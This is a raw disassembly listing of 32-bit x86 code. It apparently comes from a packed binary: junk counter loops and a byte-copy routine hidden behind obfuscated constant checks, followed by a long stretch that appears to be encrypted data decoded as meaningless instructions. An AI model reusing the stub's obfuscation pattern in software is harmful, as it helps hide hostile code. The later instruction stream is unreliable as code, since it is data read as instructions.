  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [ebx],ch
  41d514:	jb     0x41d581
  41d516:	shl    BYTE PTR [edx-0x2],0x7a
  41d51a:	jnp    0x41d4ed
  41d51c:	pushf  
  41d51d:	jnp    0x41d59a
  41d51f:	test   al,0xa0
  41d521:	jp     0x41d501
  41d523:	not    esi
  41d525:	pop    ss
  41d526:	jae    0x41d4af
  41d528:	shl    DWORD PTR [ebx+0x44],1
  41d52b:	xor    ebp,DWORD PTR [ebx]
  41d52d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d52e:	push   es
  41d52f:	test   al,0xca
  41d531:	inc    esp
  41d532:	push   cs
  41d533:	inc    esi
  41d534:	xor    bl,BYTE PTR [ebx+0x1d]
  41d537:	clc    
  41d538:	in     eax,dx
  41d539:	lods   eax,DWORD PTR ds:[esi]
  41d53a:	fs dec edx
  41d53c:	mov    WORD PTR [eax],ds
  41d53e:	xlat   BYTE PTR ds:[ebx]
  41d53f:	mov    bh,BYTE PTR [eax-0xe]
  41d542:	xchg   BYTE PTR [edx+0x5734a5b5],al
  41d548:	or     DWORD PTR [edi],eax
  41d54a:	sub    ebp,DWORD PTR [ebp+edx*1-0x1e9224ca]
  41d551:	out    0x4d,al
  41d553:	jg     0x41d580
  41d555:	pop    es
  41d556:	imul   DWORD PTR [ebx+edx*1]
  41d559:	dec    esp
  41d55a:	add    al,0x2d
  41d55c:	loop   0x41d576
  41d55e:	pop    eax
  41d55f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d560:	push   edi
  41d561:	imul   edi,esi,0x9e095d1f
  41d567:	mov    ebx,0x609d9b5a
  41d56c:	mov    edi,0x1cc427a5
  41d571:	and    eax,0x58baac52
  41d576:	popf   
  41d577:	xchg   edx,eax
  41d578:	outs   dx,BYTE PTR ds:[esi]
  41d579:	pop    edx
  41d57a:	mov    edi,0x29336258
  41d57f:	ins    BYTE PTR es:[edi],dx
  41d580:	fldcw  WORD PTR [eax-0x2de082fc]
  41d586:	sar    DWORD PTR ds:0xeea07a6e,0x66
  41d58d:	cmp    ecx,DWORD PTR [edi+0x6ba723b7]
  41d593:	stc    
  41d594:	ins    BYTE PTR es:[edi],dx
  41d595:	stc    
  41d596:	icebp  
  41d597:	popa   
  41d598:	dec    edi
  41d599:	mov    esi,0xa97b335b
  41d59e:	ficomp WORD PTR [ecx+ebx*1-0x68]
  41d5a2:	pop    esi
  41d5a3:	inc    ebx
  41d5a4:	mov    bl,0xb7
  41d5a6:	ds ds pop eax
  41d5a9:	test   DWORD PTR [eax+0x6c92a4a3],ebx
  41d5af:	ror    DWORD PTR [edx],0x68
  41d5b2:	xchg   eax,edi
  41d5b4:	inc    eax
  41d5b5:	push   esi
  41d5b6:	xor    cl,BYTE PTR [eax-0x7fd10a0b]
  41d5bc:	inc    edi
  41d5bd:	cli    
  41d5be:	outs   dx,BYTE PTR ds:[esi]
  41d5bf:	xchg   esi,eax
  41d5c0:	inc    edx
  41d5c1:	jbe    0x41d5ec
  41d5c3:	mov    WORD PTR [ebx+ebp*2],cs
  41d5c6:	fdivrp st(7),st
  41d5c8:	xchg   edi,eax
  41d5c9:	sti    
  41d5ca:	cwde   
  41d5cb:	mov    dh,0x2d
  41d5cd:	(bad)  
  41d5ce:	fsubr  DWORD PTR [eax+0xf295993]
  41d5d4:	mov    bl,0x46
  41d5d6:	adc    bl,al
  41d5d8:	jne    0x41d5c6
  41d5da:	add    BYTE PTR [eax-0x44],0xc3
  41d5de:	repnz in eax,0x48
  41d5e1:	pop    esp
  41d5e2:	push   edi
  41d5e3:	jae    0x41d5db
  41d5e5:	int    0x32
  41d5e7:	push   0x70d21665
  41d5ec:	mov    ds:0xc8b65f0f,al
  41d5f1:	loop   0x41d617
  41d5f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5f4:	mov    edx,0xfe6dd164
  41d5f9:	retf   0x131a
  41d5fc:	int3   
  41d5fd:	mov    edi,tr2
  41d600:	nop
  41d601:	sahf   
  41d602:	mov    edx,0x70b899d1
  41d607:	jl     0xd9ee6f4c
  41d60d:	les    esi,FWORD PTR [ecx-0x53c541b8]
  41d613:	jae    0x41d5a4
  41d615:	xchg   DWORD PTR [ecx-0x2e],ebp
  41d618:	nop
  41d619:	ret    0x9ea9
  41d61c:	mov    ds:0x63ac81e7,eax
  41d621:	jp     0x41d5bd
  41d623:	rol    DWORD PTR ds:0xeea424d4,1
  41d629:	dec    esp
  41d62a:	pop    ecx
  41d62b:	xchg   ecx,eax
  41d62c:	add    DWORD PTR [edi-0x12b07748],ecx
  41d632:	jnp    0x41d672
  41d634:	mov    bh,0xd5
  41d636:	daa    
  41d637:	pop    ebx
  41d638:	test   BYTE PTR [esi+0x5eef3b56],al
  41d63e:	or     eax,0x682152a8
  41d643:	cmc    
  41d644:	sbb    edi,esp
  41d646:	add    DWORD PTR [ecx+esi*4+0x2a],eax
  41d64a:	dec    edi
  41d64b:	inc    ebx
  41d64c:	push   ss
  41d64d:	jg     0x41d665
  41d64f:	je     0x41d6c6
  41d651:	cmp    BYTE PTR [edi-0x51718696],cl
  41d657:	in     eax,0xc1
  41d659:	call   0xe393:0x7fc67754
  41d660:	test   eax,0x6f8d56a2
  41d665:	push   es
  41d666:	sub    eax,0x9e8b210a
  41d66b:	push   ecx
  41d66c:	popa   
  41d66d:	xchg   DWORD PTR [ecx+edi*1],esp
  41d670:	lock hlt 
  41d672:	pop    ds
  41d673:	jne    0x41d61b
  41d675:	imul   DWORD PTR [edx+esi*8-0x45]
  41d679:	mov    ds:0x5424af81,al
  41d67e:	mov    dh,0x3d
  41d680:	mov    ebp,0x46f45d7c
  41d685:	and    eax,edi
  41d687:	in     al,dx
  41d688:	lahf   
  41d689:	xchg   ebp,eax
  41d68a:	mov    al,ds:0xa07aeb11
  41d68f:	cmp    ebp,edi
  41d691:	mov    edi,0x82f48968
  41d696:	pusha  
  41d697:	in     al,0x75
  41d699:	pushf  
  41d69a:	or     cl,bl
  41d69c:	dec    eax
  41d69d:	sub    eax,0xe97806f7
  41d6a2:	je     0x41d6c2
  41d6a4:	aas    
  41d6a5:	pop    edi
  41d6a6:	scas   eax,DWORD PTR es:[edi]
  41d6a7:	sub    al,cl
  41d6a9:	test   BYTE PTR [edx],bh
  41d6ab:	mov    edx,0x46cc2a4b
  41d6b0:	cmp    al,BYTE PTR [edi]
  41d6b2:	push   eax
  41d6b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6b4:	lods   eax,DWORD PTR ds:[esi]
  41d6b5:	push   ecx
  41d6b6:	out    0x45,al
  41d6b8:	dec    edx
  41d6b9:	inc    edx
  41d6ba:	jl     0x41d6e4
  41d6bc:	icebp  
  41d6bd:	mov    ecx,0xb5174937
  41d6c2:	(bad)  
  41d6c4:	xchg   DWORD PTR [eax],eax
  41d6c6:	mov    ebx,0x781a7b03
  41d6cb:	jg     0x41d6d3
  41d6cd:	xor    al,0x10
  41d6cf:	outs   dx,BYTE PTR ds:[esi]
  41d6d0:	pop    ebx
  41d6d1:	inc    ebx
  41d6d2:	sahf   
  41d6d3:	fild   WORD PTR ss:[eax+0x57]
  41d6d7:	cli    
  41d6d8:	imul   eax,DWORD PTR [esi-0x258ad5ed],0x57
  41d6df:	stos   BYTE PTR es:[edi],al
  41d6e0:	shl    BYTE PTR [edx+edx*4-0x5d],1
  41d6e4:	cs mov cl,cl
  41d6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6e8:	push   ss
  41d6e9:	lahf   
  41d6ea:	and    BYTE PTR [ebx],0x0
  41d6ed:	mov    esp,0xb5ba9d7c
  41d6f2:	loopne 0x41d772
  41d6f4:	inc    ebp
  41d6f5:	sub    BYTE PTR [ebx-0x20],ch
  41d6f8:	(bad)  
  41d6f9:	sub    al,0x2b
  41d6fb:	mov    ecx,DWORD PTR [edi+0x6dc1d5c1]
  41d701:	cmp    DWORD PTR [ecx-0x12],edi
  41d704:	js     0x41d71f
  41d706:	in     al,0xf4
  41d708:	xlat   BYTE PTR ds:[ebx]
  41d709:	test   eax,0x1f7c38ec
  41d70e:	mov    ebx,0x2050601b
  41d713:	popa   
  41d714:	mov    BYTE PTR [eax+0xca989f4],cl
  41d71a:	pop    ebp
  41d71b:	cmp    DWORD PTR [ebp+0x72],esi
  41d71e:	pusha  
  41d71f:	adc    BYTE PTR [ebx-0x14baafb3],bh
  41d725:	push   edi
  41d726:	push   cs
  41d727:	pusha  
  41d728:	stc    
  41d729:	cwde   
  41d72a:	push   esi
  41d72b:	shl    DWORD PTR [edx-0x3e],cl
  41d72e:	(bad)  
  41d72f:	in     eax,0x11
  41d731:	jbe    0x41d6f6
  41d733:	xlat   BYTE PTR ds:[ebx]
  41d734:	shr    BYTE PTR [esi+0xa],cl
  41d737:	fnstenv [edx+0x78d8a926]
  41d73d:	addr16 inc ecx
  41d73f:	xchg   ebp,eax
  41d740:	lods   al,BYTE PTR ds:[esi]
  41d741:	xchg   ebp,edi
  41d743:	or     BYTE PTR [eax],0xfe
  41d746:	adc    al,0xfe
  41d748:	push   esp
  41d749:	jmp    0x1ee3:0x2bce8625
  41d750:	dec    edi
  41d751:	jae    0x41d701
  41d753:	mov    ah,0xbe
  41d755:	and    esp,edx
  41d757:	push   esp
  41d758:	outs   dx,BYTE PTR ds:[esi]
  41d759:	stos   DWORD PTR es:[edi],eax
  41d75a:	ds sub ebp,edi
  41d75d:	std    
  41d75e:	push   0x8
  41d760:	retf   0xd439
  41d763:	adc    eax,0xdd395d17
  41d768:	push   0x28f82788
  41d76d:	pushf  
  41d76e:	ss shl esi,0xf9
  41d772:	mov    al,ds:0x34009788
  41d777:	mov    ds:0xde3589d7,eax
  41d77c:	js     0x41d7a9
  41d77e:	adc    BYTE PTR [edx],dh
  41d780:	and    eax,0xa969c9f7
  41d785:	xchg   esp,eax
  41d786:	push   es
  41d787:	into   
  41d788:	jmp    0x41d809
  41d78a:	sbb    eax,0x279e8349
  41d78f:	in     al,0xf5
  41d791:	lds    ebx,FWORD PTR [ebp+0x3a]
  41d794:	das    
  41d795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d796:	int3   
  41d797:	and    al,0x48
  41d799:	jg     0x41d757
  41d79b:	clc    
  41d79c:	test   DWORD PTR [edx+0x7f],0x8e4d9bb4
  41d7a3:	inc    esp
  41d7a4:	inc    ecx
  41d7a5:	(bad)  
  41d7a6:	fld    DWORD PTR [eax]
  41d7a8:	sub    ebx,DWORD PTR [edi*4-0x3644536a]
  41d7af:	mul    BYTE PTR [ebp+0x6f]
  41d7b2:	dec    DWORD PTR [esp+ebx*4+0x5cac8e99]
  41d7b9:	push   esi
  41d7ba:	scas   al,BYTE PTR es:[edi]
  41d7bb:	mov    bl,0x9a
  41d7bd:	mov    WORD PTR [ebx+ebp*2-0x16],?
  41d7c1:	inc    ecx
  41d7c2:	xor    DWORD PTR [edx+0x181adedd],ecx
  41d7c8:	jmp    FWORD PTR [edx+0x633d39d3]
  41d7ce:	dec    esi
  41d7cf:	jo     0x41d7e2
  41d7d1:	enter  0xf4b,0x13
  41d7d5:	inc    esi
  41d7d6:	retf   
  41d7d7:	cmp    BYTE PTR [edx+edi*1],dl
  41d7da:	cwde   
  41d7db:	sbb    eax,0x3e6130e8
  41d7e0:	inc    esi
  41d7e1:	enter  0xb6b3,0xfa
  41d7e5:	and    edi,DWORD PTR [esi-0x62ce7c75]
  41d7eb:	jo     0x41d7bf
  41d7ed:	clc    
  41d7ee:	das    
  41d7ef:	add    BYTE PTR [esi-0x42],al
  41d7f2:	xchg   ebx,eax
  41d7f3:	mov    eax,ds:0xf1d01abb
  41d7f8:	neg    BYTE PTR ds:0xf946e1c7
  41d7fe:	inc    ebp
  41d7ff:	pop    esp
  41d800:	ins    DWORD PTR es:[edi],dx
  41d801:	sub    ebx,DWORD PTR [esi-0x1c]
  41d804:	sub    al,0xa1
  41d806:	inc    ebx
  41d807:	out    dx,eax
  41d808:	add    al,0xa
  41d80a:	mov    esp,0xbd051d67
  41d80f:	into   
  41d810:	shl    BYTE PTR [edx-0x7b],1
  41d813:	sub    eax,0x1fa03ff2
  41d818:	inc    ebx
  41d819:	sub    edx,DWORD PTR [ecx-0x515758ad]
  41d81f:	or     edx,DWORD PTR [ebx+0x4b]
  41d822:	push   eax
  41d823:	sahf   
  41d824:	shr    DWORD PTR [esi],1
  41d826:	push   edx
  41d827:	sbb    ecx,DWORD PTR [edi]
  41d829:	ds mov ebp,0x24aa1693
  41d82f:	mov    cs,WORD PTR [esi]
  41d831:	add    edx,ebp
  41d833:	(bad)  
  41d836:	bound  eax,QWORD PTR [edi]
  41d838:	sbb    al,0x1d
  41d83a:	imul   ecx,DWORD PTR [edi+ebp*8+0x458e0ce8],0x30
  41d842:	ja     0x41d82f
  41d844:	mov    al,ds:0xfb73afa
  41d849:	and    eax,0xaffaed8
  41d84e:	cdq    
  41d84f:	fldcw  WORD PTR [ecx+0x71]
  41d852:	push   ss
  41d853:	sbb    al,BYTE PTR [edx]
  41d855:	call   DWORD PTR [ecx+0x8]
  41d858:	ficom  WORD PTR [esi+esi*4]
  41d85b:	mov    edi,0xe84db822
  41d860:	push   esp
  41d861:	hlt    
  41d862:	push   0x38
  41d864:	popf   
  41d865:	ins    DWORD PTR es:[edi],dx
  41d866:	(bad)  
  41d867:	jne    0x41d7ef
  41d869:	cli    
  41d86a:	pop    edx
  41d86b:	sbb    al,0xc2
  41d86d:	repnz scas eax,DWORD PTR es:[edi]
  41d86f:	adc    DWORD PTR [ebp+0x19d1ea65],ecx
  41d875:	mov    ch,0x5d
  41d877:	cld    
  41d878:	sbb    al,0x11
  41d87a:	xchg   ecx,eax
  41d87b:	test   BYTE PTR [esi],cl
  41d87d:	xor    eax,0xba783644
  41d882:	mov    ch,ch
  41d884:	fcomi  st,st(6)
  41d886:	and    dh,ah
  41d888:	(bad)  
  41d88a:	pop    ecx
  41d88b:	pop    ecx
  41d88c:	mov    ah,0xc8
  41d88e:	mov    esi,0x315ed1ec
  41d893:	jns    0x41d8c4
  41d895:	lds    eax,FWORD PTR [eax+0x2c]
  41d898:	add    BYTE PTR [ebx],ch
  41d89a:	jge    0x41d837
  41d89c:	test   DWORD PTR [ecx+esi*2],ebp
  41d89f:	out    dx,eax
  41d8a0:	sub    BYTE PTR ds:0x42df5fa2,al
  41d8a6:	ja     0x41d87c
  41d8a8:	inc    edx
  41d8a9:	inc    ebx
  41d8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8ab:	int    0x7c
  41d8ad:	popa   
  41d8ae:	mov    dh,0x4
  41d8b0:	(bad)  
  41d8b1:	std    
  41d8b2:	imul   edx,DWORD PTR [esi+0x2d13493d],0x5
  41d8b9:	int    0x6b
  41d8bb:	arpl   ax,dx
  41d8bd:	adc    DWORD PTR [ecx],0xffffff8d
  41d8c0:	ret    
  41d8c1:	mov    cl,BYTE PTR [eax-0x53]
  41d8c4:	mov    edx,0x120952d8
  41d8c9:	int3   
  41d8ca:	jo     0x41d94a
  41d8cc:	lock xor al,BYTE PTR [ebx]
  41d8cf:	pop    ebp
  41d8d0:	inc    eax
  41d8d1:	out    dx,al
  41d8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8d3:	push   fs
  41d8d5:	scas   al,BYTE PTR es:[edi]
  41d8d6:	pop    ecx
  41d8d7:	fst    QWORD PTR [ecx+0x3bb27166]
  41d8dd:	xor    eax,ebx
  41d8df:	call   0x228b:0x3e592a1f
  41d8e6:	add    cl,ch
  41d8e8:	in     eax,0x2d
  41d8ea:	jg     0x41d95d
  41d8ec:	aas    
  41d8ed:	(bad)  [eax-0x74]
  41d8f0:	test   al,0xc5
  41d8f2:	and    al,0x4f
  41d8f4:	test   BYTE PTR [ebp-0x18],ah
  41d8f7:	push   ss
  41d8f8:	mov    ds:0x33daa887,eax
  41d8fd:	ret    0x5cbc
  41d900:	adc    BYTE PTR [eax+0x6e],al
  41d903:	jmp    0xdb4669a6
  41d908:	or     eax,0xf37df456
  41d90d:	mov    cl,0x13
  41d90f:	loope  0x41d8d2
  41d911:	jmp    0x481b:0x478bf9c3
  41d918:	out    0x86,al
  41d91a:	aas    
  41d91b:	jnp    0x41d946
  41d91d:	add    al,0xec
  41d91f:	dec    edi
  41d920:	loopne 0x41d919
  41d922:	pop    edx
  41d923:	neg    DWORD PTR es:[eax]
  41d926:	mov    ebx,0x22cd6583
  41d92b:	scas   al,BYTE PTR es:[edi]
  41d92c:	pop    edx
  41d92d:	and    esp,DWORD PTR [esi]
  41d92f:	sbb    BYTE PTR [edi+0x29],ch
  41d932:	aad    0xec
  41d934:	inc    ebx
  41d935:	or     edi,ecx
  41d937:	imul   ebx,DWORD PTR [ebp+0x50],0xffffffd5
  41d93b:	inc    eax
  41d93c:	(bad)  
  41d93e:	cdq    
  41d93f:	mov    eax,ds:0xb7455410
  41d944:	xchg   esp,eax
  41d945:	xor    eax,0xac4c5727
  41d94a:	call   0x893a:0x6cc465a6
  41d951:	dec    ebp
  41d952:	adc    ch,BYTE PTR [edi+0x50ce4ee1]
  41d958:	push   ecx
  41d959:	mov    WORD PTR [ecx+0x4ce1e653],gs
  41d95f:	push   esi
  41d960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d961:	sahf   
  41d962:	adc    dl,al
  41d964:	lods   al,BYTE PTR ds:[esi]
  41d965:	jge    0x41d95a
  41d967:	mov    DWORD PTR [edx],eax
  41d969:	dec    ebp
  41d96a:	pop    edx
  41d96b:	xor    dh,BYTE PTR [esi]
  41d96d:	rep stos DWORD PTR es:[edi],eax
  41d96f:	dec    ebx
  41d970:	out    dx,eax
  41d971:	pop    es
  41d972:	fild   WORD PTR [ecx-0x1a]
  41d975:	std    
  41d976:	int    0xc
  41d978:	fild   WORD PTR [ecx+ecx*1+0x1fa5e125]
  41d97f:	retf   0x10f7
  41d982:	dec    eax
  41d983:	pop    edx
  41d984:	cs add al,cl
  41d987:	cmp    DWORD PTR [ecx+0x5df18870],edx
  41d98d:	lahf   
  41d98e:	aam    0x20
  41d990:	cmp    eax,0x83e55b4e
  41d995:	popa   
  41d996:	int3   
  41d997:	inc    ecx
  41d998:	ror    BYTE PTR [edx+0x56ed0b0],0xa7
  41d99f:	sbb    dl,BYTE PTR [ebx+ecx*1-0x55814c84]
  41d9a6:	xchg   ebx,eax
  41d9a7:	call   0x96661130
  41d9ac:	lahf   
  41d9ad:	mov    cl,0x5a
  41d9af:	inc    ebx
  41d9b0:	mov    eax,ds:0x5c0fae3c
  41d9b5:	and    eax,ebp
  41d9b7:	in     eax,dx
  41d9b8:	jmp    DWORD PTR [edi-0x63]
  41d9bb:	mov    ds:0x81842b1a,al
  41d9c0:	cs in  al,0xb6
  41d9c3:	push   0x8db880d3
  41d9c8:	mov    dl,0xac
  41d9ca:	add    DWORD PTR [esi-0x1b],edx
  41d9cd:	pop    ebp
  41d9ce:	inc    ebx
  41d9cf:	xor    ebx,ecx
  41d9d1:	test   BYTE PTR [ebx+0x70e6ddbc],al
  41d9d7:	mov    ds,WORD PTR [esi-0x6a]
  41d9da:	icebp  
  41d9db:	and    al,0x67
  41d9dd:	pop    esp
  41d9de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9df:	cdq    
  41d9e0:	jb     0x41da30
  41d9e2:	mov    edi,0x1ff56126
  41d9e7:	jne    0x41d9f1
  41d9e9:	pop    ebx
  41d9ea:	mov    eax,ds:0x127c4d47
  41d9ef:	test   al,0xb1
  41d9f1:	es ret 
  41d9f3:	pop    esi
  41d9f4:	jno    0x41d9bc
  41d9f6:	pop    esp
  41d9f7:	lock dec esp
  41d9f9:	sub    ah,BYTE PTR [ecx+esi*1-0x65]
  41d9fd:	mov    ah,0xf8
  41d9ff:	mov    esp,DWORD PTR [edi+0x7ebd5d4a]
  41da05:	dec    ebx
  41da06:	js     0x41d9a9
  41da08:	std    
  41da09:	retf   
  41da0a:	ja     0x41d9ae
  41da0c:	cmc    
  41da0d:	xchg   esp,eax
  41da0e:	mov    BYTE PTR [eax-0x2a],bh
  41da11:	fisttp DWORD PTR [ecx+edx*8-0x21]
  41da15:	test   al,0x46
  41da17:	arpl   WORD PTR [eax+0x52793232],sp
  41da1d:	imul   eax,DWORD PTR [edx-0x4fcbbdbe],0xf9f73b95
  41da27:	mov    ch,0xca
  41da29:	enter  0x122,0xf5
  41da2d:	mov    ds:0xd173496f,eax
  41da32:	jae    0x41da4c
  41da34:	leave  
  41da35:	(bad)  
  41da36:	push   ebx
  41da37:	imul   esi,DWORD PTR [edx-0x15681635],0x4d
  41da3e:	mov    cl,0x9c
  41da40:	out    0x2b,al
  41da42:	mov    ch,0xed
  41da44:	js     0x41d9f5
  41da46:	mov    ecx,0x20455fac
  41da4b:	cmp    cl,cl
  41da4d:	mov    dl,0x90
  41da4f:	pop    ecx
  41da50:	inc    edi
  41da51:	cmp    ebx,eax
  41da53:	push   ds
  41da54:	ds dec esi
  41da56:	inc    ebx
  41da57:	adc    DWORD PTR [esi],ecx
  41da59:	sti    
  41da5a:	and    ebp,DWORD PTR [eax-0x690dfd22]
  41da60:	adc    bh,BYTE PTR [ebp+eiz*1-0x40b443e]
  41da67:	in     eax,0x7a
  41da69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da6a:	mov    eax,0x9346615b
  41da6f:	pop    edi
  41da70:	inc    ebp
  41da71:	sub    DWORD PTR [eax-0x2dc52e7b],edi
  41da77:	jb     0x41da05
  41da79:	iret   
  41da7a:	mov    ah,0x6f
  41da7c:	fisub  WORD PTR [esi+0x1ffa3c81]
  41da82:	jmp    0x41da29
  41da84:	push   esi
  41da85:	push   0xf03bf065
  41da8a:	sbb    BYTE PTR [ecx+0x13],0x6f
  41da8e:	jmp    0x41db0a
  41da90:	call   0x7bdb98f5
  41da95:	jnp    0x41dae2
  41da97:	scas   eax,DWORD PTR es:[edi]
  41da98:	cmp    eax,0x6eb76e07
  41da9d:	cwde   
  41da9e:	nop
  41da9f:	test   eax,0xb9494abb
  41daa4:	pop    edi
  41daa5:	adc    DWORD PTR [eax],ebp
  41daa7:	cmp    eax,0xc59df229
  41daac:	mov    eax,0x51c6e37
  41dab1:	jnp    0x41daef
  41dab3:	xor    dh,dl
  41dab5:	jecxz  0x41dab0
  41dab7:	js     0x41db2a
  41dab9:	push   0xa0ef08ae
  41dabe:	outs   dx,BYTE PTR ds:[esi]
  41dabf:	out    0x75,al
  41dac1:	pop    ecx
  41dac2:	jg     0x41da69
  41dac4:	mov    eax,ds:0xb2bece04
  41dac9:	sbb    dl,0x58
  41dacc:	call   0x3b1c:0x16c08fff
  41dad3:	(bad)  
  41dad4:	lock (bad) 
  41dad6:	adc    dh,BYTE PTR [edx]
  41dad8:	popa   
  41dad9:	sub    edi,edi
  41dadb:	es int 0x1a
  41dade:	ret    
  41dadf:	shl    dh,0x56
  41dae2:	add    al,0xf7
  41dae4:	jnp    0x41db50
  41dae6:	jo     0x41db0a
  41dae8:	jo     0x41db5e
  41daea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daeb:	mov    bh,0xaa
  41daed:	pusha  
  41daee:	dec    edx
  41daef:	mov    esp,0xd27d6859
  41daf4:	dec    edx
  41daf5:	mov    ah,0x21
  41daf7:	xlat   BYTE PTR ds:[ebx]
  41daf8:	les    eax,FWORD PTR [eax]
  41dafa:	repnz idiv DWORD PTR [edi-0x754b59ff]
  41db01:	xor    al,BYTE PTR [esi+ecx*1-0x4e989d47]
  41db08:	dec    ebp
  41db09:	jmp    0xbb04e003
  41db0e:	retf   0x484
  41db11:	xchg   esi,eax
  41db12:	xchg   ecx,eax
  41db13:	dec    ebp
  41db14:	cdq    
  41db15:	aam    0x22
  41db17:	data16 adc al,0xce
  41db1a:	nop
